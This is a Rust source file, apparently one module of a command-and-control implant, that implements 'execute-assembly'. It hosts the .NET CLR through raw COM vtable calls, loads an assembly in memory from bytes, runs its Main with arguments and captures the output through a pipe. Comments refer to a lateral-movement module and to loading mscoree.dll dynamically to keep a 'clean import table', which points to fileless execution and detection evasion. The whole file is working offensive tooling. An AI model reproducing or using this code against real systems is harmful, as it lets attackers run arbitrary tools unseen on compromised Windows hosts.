//! execute-assembly — in-memory .NET assembly execution via CLR hosting.
//!
//! All Win32 / COM calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get a stub that returns an error string.
//!
//! Uses manual `extern "system"` FFI + COM vtable calls (same pattern
//! as lateral.rs).

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{anyhow, Result};
    use std::ffi::c_void;
    use std::ptr::{null, null_mut};

    // ── FFI declarations ─────────────────────────────────────

    #[link(name = "kernel32")]
    extern "system" {
        fn GetLastError() -> u32;
        fn GetStdHandle(nStdHandle: u32) -> isize;
        fn SetStdHandle(nStdHandle: u32, hHandle: isize) -> i32;
        fn CreatePipe(
            hReadPipe: *mut isize,
            hWritePipe: *mut isize,
            lpPipeAttributes: *const SecurityAttributes,
            nSize: u32,
        ) -> i32;
        fn ReadFile(
            hFile: isize,
            lpBuffer: *mut u8,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn PeekNamedPipe(
            hNamedPipe: isize,
            lpBuffer: *mut c_void,
            nBufferSize: u32,
            lpBytesRead: *mut u32,
            lpTotalBytesAvail: *mut u32,
            lpBytesLeftThisMessage: *mut u32,
        ) -> i32;
        fn CloseHandle(hObject: isize) -> i32;
        fn LoadLibraryW(lpLibFileName: *const u16) -> isize;
        fn GetProcAddress(hModule: isize, lpProcName: *const u8) -> *const c_void;
        fn FreeLibrary(hModule: isize) -> i32;
    }

    #[link(name = "ole32")]
    extern "system" {
        fn CoInitializeEx(pvReserved: *const c_void, dwCoInit: u32) -> i32;
        fn CoUninitialize();
    }

    #[link(name = "oleaut32")]
    extern "system" {
        fn SafeArrayCreateVector(vt: u16, lLbound: i32, cElements: u32) -> *mut c_void;
        fn SafeArrayAccessData(psa: *mut c_void, ppvData: *mut *mut c_void) -> i32;
        fn SafeArrayUnaccessData(psa: *mut c_void) -> i32;
        fn SafeArrayDestroy(psa: *mut c_void) -> i32;
        fn SysAllocString(psz: *const u16) -> *mut u16;
    }

    // ── Constants ────────────────────────────────────────────

    const COINIT_MULTITHREADED: u32 = 0;
    const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5; // (DWORD)-11
    const STD_ERROR_HANDLE: u32 = 0xFFFF_FFF4; // (DWORD)-12
    const VT_UI1: u16 = 17; // unsigned byte
    const VT_BSTR: u16 = 8;
    const VT_VARIANT: u16 = 12;
    const VT_ARRAY: u16 = 0x2000;

    // ── Types ────────────────────────────────────────────────

    #[repr(C)]
    struct Guid {
        data1: u32,
        data2: u16,
        data3: u16,
        data4: [u8; 8],
    }

    #[repr(C)]
    struct SecurityAttributes {
        n_length: u32,
        lp_security_descriptor: *mut c_void,
        b_inherit_handle: i32,
    }

    /// VARIANT — 8-byte header + pointer-sized union data.
    /// Total: 16 bytes on x86, 24 bytes on x64.
    #[repr(C)]
    #[derive(Copy, Clone)]
    struct Variant {
        vt: u16,
        _pad: [u16; 3],
        data: [usize; 2],
    }

    impl Variant {
        fn empty() -> Self {
            Self {
                vt: 0, // VT_EMPTY
                _pad: [0; 3],
                data: [0; 2],
            }
        }
    }

    // ── GUIDs / IIDs ─────────────────────────────────────────

    // CLSID_CLRMetaHost {9280188D-0E8E-4867-B30C-7FA83884E8DE}
    static CLSID_CLR_META_HOST: Guid = Guid {
        data1: 0x9280188D,
        data2: 0x0E8E,
        data3: 0x4867,
        data4: [0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE],
    };

    // IID_ICLRMetaHost {D332DB9E-B9B3-4125-8207-A14884F53216}
    static IID_ICLR_META_HOST: Guid = Guid {
        data1: 0xD332DB9E,
        data2: 0xB9B3,
        data3: 0x4125,
        data4: [0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16],
    };

    // IID_ICLRRuntimeInfo {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
    static IID_ICLR_RUNTIME_INFO: Guid = Guid {
        data1: 0xBD39D1D2,
        data2: 0xBA2F,
        data3: 0x486A,
        data4: [0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91],
    };

    // CLSID_CorRuntimeHost {CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}
    static CLSID_COR_RUNTIME_HOST: Guid = Guid {
        data1: 0xCB2F6723,
        data2: 0xAB3A,
        data3: 0x11D2,
        data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
    };

    // IID_ICorRuntimeHost {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}
    static IID_ICOR_RUNTIME_HOST: Guid = Guid {
        data1: 0xCB2F6722,
        data2: 0xAB3A,
        data3: 0x11D2,
        data4: [0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E],
    };

    // IID__AppDomain {05F696DC-2B29-3663-AD8B-C4389CF2A713}
    static IID_APP_DOMAIN: Guid = Guid {
        data1: 0x05F696DC,
        data2: 0x2B29,
        data3: 0x3663,
        data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
    };

    // ── Helpers ──────────────────────────────────────────────

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// IUnknown::Release (vtable index 2).
    fn com_release(obj: *mut c_void) {
        if obj.is_null() {
            return;
        }
        unsafe {
            let vtbl = *(obj as *const *const usize);
            let release: unsafe extern "system" fn(*mut c_void) -> u32 =
                std::mem::transmute(*vtbl.add(2));
            release(obj);
        }
    }

    /// IUnknown::QueryInterface (vtable index 0).
    unsafe fn com_qi(obj: *mut c_void, iid: *const Guid, out: *mut *mut c_void) -> i32 {
        let vtbl = *(obj as *const *const usize);
        let qi: unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32 =
            std::mem::transmute(*vtbl.add(0));
        qi(obj, iid, out)
    }

    /// Read a function pointer from a COM vtable by index.
    ///
    /// # Safety
    /// `obj` must be a valid COM interface pointer and `idx` a correct vtable slot.
    unsafe fn vtable_fn(obj: *mut c_void, idx: usize) -> usize {
        let vtbl = *(obj as *const *const usize);
        *vtbl.add(idx)
    }

    /// RAII guard — calls CoUninitialize on drop.
    struct ComGuard;
    impl Drop for ComGuard {
        fn drop(&mut self) {
            unsafe { CoUninitialize() };
        }
    }

    /// Create a SAFEARRAY of VT_UI1 (bytes) from a slice.
    unsafe fn create_byte_safearray(data: &[u8]) -> Result<*mut c_void> {
        let psa = SafeArrayCreateVector(VT_UI1, 0, data.len() as u32);
        if psa.is_null() {
            return Err(anyhow!("SafeArrayCreateVector(UI1) failed"));
        }
        let mut raw: *mut c_void = null_mut();
        let hr = SafeArrayAccessData(psa, &mut raw);
        if hr < 0 {
            SafeArrayDestroy(psa);
            return Err(anyhow!("SafeArrayAccessData: 0x{:08X}", hr as u32));
        }
        std::ptr::copy_nonoverlapping(data.as_ptr(), raw as *mut u8, data.len());
        SafeArrayUnaccessData(psa);
        Ok(psa)
    }

    /// Create a SAFEARRAY of VT_BSTR from string slices.
    unsafe fn create_bstr_safearray(strings: &[String]) -> Result<*mut c_void> {
        let psa = SafeArrayCreateVector(VT_BSTR, 0, strings.len() as u32);
        if psa.is_null() {
            return Err(anyhow!("SafeArrayCreateVector(BSTR) failed"));
        }
        let mut raw: *mut c_void = null_mut();
        let hr = SafeArrayAccessData(psa, &mut raw);
        if hr < 0 {
            SafeArrayDestroy(psa);
            return Err(anyhow!("SafeArrayAccessData(BSTR): 0x{:08X}", hr as u32));
        }
        let arr = raw as *mut *mut u16;
        for (i, s) in strings.iter().enumerate() {
            let w = wide(s);
            *arr.add(i) = SysAllocString(w.as_ptr());
        }
        SafeArrayUnaccessData(psa);
        Ok(psa)
    }

    /// Drain all available bytes from a pipe read handle.
    unsafe fn drain_pipe(read_handle: isize) -> String {
        let mut output = Vec::new();
        let mut buf = [0u8; 4096];
        loop {
            let mut avail: u32 = 0;
            if PeekNamedPipe(
                read_handle,
                null_mut(),
                0,
                null_mut(),
                &mut avail,
                null_mut(),
            ) == 0
                || avail == 0
            {
                break;
            }
            let mut n: u32 = 0;
            if ReadFile(read_handle, buf.as_mut_ptr(), buf.len() as u32, &mut n, null_mut()) == 0
                || n == 0
            {
                break;
            }
            output.extend_from_slice(&buf[..n as usize]);
        }
        String::from_utf8_lossy(&output).into_owned()
    }

    // ── COM vtable indices ───────────────────────────────────
    //
    //   ICLRMetaHost::GetRuntime          = 3
    //   ICLRRuntimeInfo::GetInterface     = 9
    //   ICorRuntimeHost::Start            = 10
    //   ICorRuntimeHost::GetDefaultDomain = 13
    //   _AppDomain::Load_3               = 41  (SAFEARRAY<UI1> → _Assembly)
    //   _Assembly::get_EntryPoint         = 16  (→ _MethodInfo)
    //   _MethodInfo::Invoke_3             = 37  (obj, params → retval)

    // COM method function-pointer type aliases.

    type CLRCreateInstanceFn = unsafe extern "system" fn(
        *const Guid,
        *const Guid,
        *mut *mut c_void,
    ) -> i32;

    type GetRuntimeFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICLRMetaHost)
        *const u16,       // pwzVersion
        *const Guid,      // riid
        *mut *mut c_void, // ppRuntime
    ) -> i32;

    type GetInterfaceFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICLRRuntimeInfo)
        *const Guid,      // rclsid
        *const Guid,      // riid
        *mut *mut c_void, // ppUnk
    ) -> i32;

    type StartFn = unsafe extern "system" fn(*mut c_void) -> i32;

    type GetDefaultDomainFn = unsafe extern "system" fn(
        *mut c_void,      // this (ICorRuntimeHost)
        *mut *mut c_void, // pAppDomain (IUnknown**)
    ) -> i32;

    type AppDomainLoad3Fn = unsafe extern "system" fn(
        *mut c_void,      // this (_AppDomain)
        *mut c_void,      // rawAssembly (SAFEARRAY*)
        *mut *mut c_void, // pRetVal (_Assembly**)
    ) -> i32;

    type GetEntryPointFn = unsafe extern "system" fn(
        *mut c_void,      // this (_Assembly)
        *mut *mut c_void, // pRetVal (_MethodInfo**)
    ) -> i32;

    // _MethodInfo::Invoke_3(VARIANT obj, SAFEARRAY* params, VARIANT* retval)
    // On x64 by-value VARIANT (24 bytes) is passed via implicit pointer.
    type Invoke3Fn = unsafe extern "system" fn(
        *mut c_void,      // this (_MethodInfo)
        Variant,          // obj — VT_EMPTY for static Main
        *mut c_void,      // parameters (SAFEARRAY of VARIANT)
        *mut Variant,     // pRetVal
    ) -> i32;

    // ── Core implementation ──────────────────────────────────

    unsafe fn execute_assembly_inner(
        assembly_bytes: &[u8],
        args: &[String],
    ) -> Result<(i32, String, String)> {
        // 1. Initialize COM (multithreaded apartment).
        let hr = CoInitializeEx(null(), COINIT_MULTITHREADED);
        // S_OK=0, S_FALSE=1 (already init), RPC_E_CHANGED_MODE=0x80010106 all acceptable.
        if hr < 0 && hr != 0x80010106u32 as i32 {
            return Err(anyhow!("CoInitializeEx: 0x{:08X}", hr as u32));
        }
        let _com = ComGuard;

        // 2. Load mscoree.dll dynamically (no link-time dep → clean import table).
        let mscoree = LoadLibraryW(wide("mscoree.dll").as_ptr());
        if mscoree == 0 {
            return Err(anyhow!(
                "LoadLibrary(mscoree.dll): error {} — .NET Framework installed?",
                GetLastError()
            ));
        }
        let proc = GetProcAddress(mscoree, b"CLRCreateInstance\0".as_ptr());
        if proc.is_null() {
            FreeLibrary(mscoree);
            return Err(anyhow!("CLRCreateInstance not found in mscoree.dll"));
        }
        let clr_create: CLRCreateInstanceFn = std::mem::transmute(proc);

        // 3. CLRCreateInstance → ICLRMetaHost.
        let mut meta_host: *mut c_void = null_mut();
        let hr = clr_create(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
        if hr < 0 {
            FreeLibrary(mscoree);
            return Err(anyhow!("CLRCreateInstance: 0x{:08X}", hr as u32));
        }

        // 4. ICLRMetaHost::GetRuntime("v4.0.30319") → ICLRRuntimeInfo.
        let ver = wide("v4.0.30319");
        let mut runtime_info: *mut c_void = null_mut();
        let get_runtime: GetRuntimeFn = std::mem::transmute(vtable_fn(meta_host, 3));
        let hr = get_runtime(meta_host, ver.as_ptr(), &IID_ICLR_RUNTIME_INFO, &mut runtime_info);
        if hr < 0 {
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("GetRuntime(v4.0.30319): 0x{:08X}", hr as u32));
        }

        // 5. ICLRRuntimeInfo::GetInterface → ICorRuntimeHost.
        let mut runtime_host: *mut c_void = null_mut();
        let get_iface: GetInterfaceFn = std::mem::transmute(vtable_fn(runtime_info, 9));
        let hr = get_iface(
            runtime_info,
            &CLSID_COR_RUNTIME_HOST,
            &IID_ICOR_RUNTIME_HOST,
            &mut runtime_host,
        );
        if hr < 0 {
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!(
                "GetInterface(ICorRuntimeHost): 0x{:08X}",
                hr as u32
            ));
        }

        // 6. ICorRuntimeHost::Start() — S_FALSE (1) means already running, that's OK.
        let start: StartFn = std::mem::transmute(vtable_fn(runtime_host, 10));
        let hr = start(runtime_host);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("ICorRuntimeHost::Start: 0x{:08X}", hr as u32));
        }

        // 7. GetDefaultDomain → IUnknown, then QI for _AppDomain.
        let mut domain_unk: *mut c_void = null_mut();
        let get_domain: GetDefaultDomainFn = std::mem::transmute(vtable_fn(runtime_host, 13));
        let hr = get_domain(runtime_host, &mut domain_unk);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("GetDefaultDomain: 0x{:08X}", hr as u32));
        }

        let mut app_domain: *mut c_void = null_mut();
        let hr = com_qi(domain_unk, &IID_APP_DOMAIN, &mut app_domain);
        com_release(domain_unk);
        if hr < 0 {
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("QI(_AppDomain): 0x{:08X}", hr as u32));
        }

        // 8. Redirect stdout/stderr to anonymous pipe for output capture.
        //    .NET Console lazily initialises its TextWriter from the current
        //    StdHandle, so redirecting before the assembly runs captures output.
        let mut pipe_rd: isize = 0;
        let mut pipe_wr: isize = 0;
        let sa = SecurityAttributes {
            n_length: std::mem::size_of::<SecurityAttributes>() as u32,
            lp_security_descriptor: null_mut(),
            b_inherit_handle: 1,
        };
        if CreatePipe(&mut pipe_rd, &mut pipe_wr, &sa, 0) == 0 {
            com_release(app_domain);
            com_release(runtime_host);
            com_release(runtime_info);
            com_release(meta_host);
            FreeLibrary(mscoree);
            return Err(anyhow!("CreatePipe: error {}", GetLastError()));
        }

        let orig_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
        let orig_stderr = GetStdHandle(STD_ERROR_HANDLE);
        SetStdHandle(STD_OUTPUT_HANDLE, pipe_wr);
        SetStdHandle(STD_ERROR_HANDLE, pipe_wr);

        // Helper: restore handles and close pipe, then release COM objects.
        macro_rules! cleanup {
            ($($obj:expr),*) => {{
                CloseHandle(pipe_wr);
                SetStdHandle(STD_OUTPUT_HANDLE, orig_stdout);
                SetStdHandle(STD_ERROR_HANDLE, orig_stderr);
                let captured = drain_pipe(pipe_rd);
                CloseHandle(pipe_rd);
                $(com_release($obj);)*
                com_release(app_domain);
                com_release(runtime_host);
                com_release(runtime_info);
                com_release(meta_host);
                FreeLibrary(mscoree);
                captured
            }};
        }

        // 9. _AppDomain::Load_3(SAFEARRAY<UI1>) → _Assembly.
        let sa_bytes = match create_byte_safearray(assembly_bytes) {
            Ok(sa) => sa,
            Err(e) => {
                let _ = cleanup!();
                return Err(e);
            }
        };
        let mut assembly: *mut c_void = null_mut();
        let load3: AppDomainLoad3Fn = std::mem::transmute(vtable_fn(app_domain, 41));
        let hr = load3(app_domain, sa_bytes, &mut assembly);
        SafeArrayDestroy(sa_bytes);
        if hr < 0 {
            let captured = cleanup!();
            return Err(anyhow!(
                "AppDomain::Load_3: 0x{:08X}{}",
                hr as u32,
                if captured.is_empty() {
                    String::new()
                } else {
                    format!("\n{}", captured)
                }
            ));
        }

        // 10. _Assembly::get_EntryPoint → _MethodInfo.
        let mut entry_point: *mut c_void = null_mut();
        let get_ep: GetEntryPointFn = std::mem::transmute(vtable_fn(assembly, 16));
        let hr = get_ep(assembly, &mut entry_point);
        if hr < 0 || entry_point.is_null() {
            let captured = cleanup!(assembly);
            return Err(anyhow!(
                "get_EntryPoint: 0x{:08X} (is this a DLL without Main?){}",
                hr as u32,
                if captured.is_empty() {
                    String::new()
                } else {
                    format!("\n{}", captured)
                }
            ));
        }

        // 11. Build parameters SAFEARRAY and invoke _MethodInfo::Invoke_3.
        //
        //     For Main(string[] args):
        //       outer SAFEARRAY(VARIANT) has 1 element — a VT_ARRAY|VT_BSTR variant
        //       pointing to the inner SAFEARRAY(BSTR).
        //
        //     For Main() with no params:
        //       outer SAFEARRAY(VARIANT) has 0 elements.
        let invoke: Invoke3Fn = std::mem::transmute(vtable_fn(entry_point, 37));

        // Build inner SAFEARRAY(BSTR) for string[] args.
        let sa_strings = match create_bstr_safearray(args) {
            Ok(sa) => sa,
            Err(e) => {
                let _ = cleanup!(entry_point, assembly);
                return Err(e);
            }
        };

        // Wrap into outer SAFEARRAY(VARIANT) with 1 element.
        let params_sa = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if params_sa.is_null() {
            SafeArrayDestroy(sa_strings);
            let _ = cleanup!(entry_point, assembly);
            return Err(anyhow!("SafeArrayCreateVector(VARIANT) failed"));
        }
        let args_var = Variant {
            vt: VT_ARRAY | VT_BSTR,
            _pad: [0; 3],
            data: [sa_strings as usize, 0],
        };
        let mut pdata: *mut c_void = null_mut();
        SafeArrayAccessData(params_sa, &mut pdata);
        std::ptr::copy_nonoverlapping(
            &args_var as *const _ as *const u8,
            pdata as *mut u8,
            std::mem::size_of::<Variant>(),
        );
        SafeArrayUnaccessData(params_sa);
        // params_sa now owns sa_strings (SafeArrayDestroy will VariantClear it).

        let mut retval = Variant::empty();
        let hr = invoke(entry_point, Variant::empty(), params_sa, &mut retval);

        // If invoke failed, retry without parameters (Main() with no args).
        let invoke_hr = if hr < 0 {
            let empty_params = SafeArrayCreateVector(VT_VARIANT, 0, 0);
            if !empty_params.is_null() {
                let mut retval2 = Variant::empty();
                let hr2 = invoke(entry_point, Variant::empty(), empty_params, &mut retval2);
                SafeArrayDestroy(empty_params);
                if hr2 >= 0 { hr2 } else { hr }
            } else {
                hr
            }
        } else {
            hr
        };

        // 12. Cleanup params (destroys nested sa_strings via VariantClear).
        SafeArrayDestroy(params_sa);

        // 13. Capture output and release everything.
        let captured = cleanup!(entry_point, assembly);

        if invoke_hr < 0 {
            Ok((
                1,
                captured,
                format!("Invoke_3: 0x{:08X}", invoke_hr as u32),
            ))
        } else {
            Ok((0, captured, String::new()))
        }
    }

    /// Execute a .NET assembly in-memory via CLR hosting.
    ///
    /// Runs on a blocking thread with a 60-second timeout.
    pub async fn execute_assembly(
        assembly_bytes: Vec<u8>,
        args: Vec<String>,
    ) -> Result<(i32, String, String)> {
        let handle = tokio::task::spawn_blocking(move || unsafe {
            execute_assembly_inner(&assembly_bytes, &args)
        });
        match tokio::time::timeout(std::time::Duration::from_secs(60), handle).await {
            Ok(Ok(result)) => result,
            Ok(Err(e)) => Ok((1, String::new(), format!("assembly thread panicked: {}", e))),
            Err(_) => Ok((
                1,
                String::new(),
                "execute-assembly timed out (60s)".to_string(),
            )),
        }
    }
}

// ─── Non-Windows stub ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    pub async fn execute_assembly(
        _assembly_bytes: Vec<u8>,
        _args: Vec<String>,
    ) -> anyhow::Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "execute-assembly requires Windows".to_string(),
        ))
    }
}

#[cfg(target_os = "windows")]
pub use win::execute_assembly;

#[cfg(not(target_os = "windows"))]
pub use stub::execute_assembly;
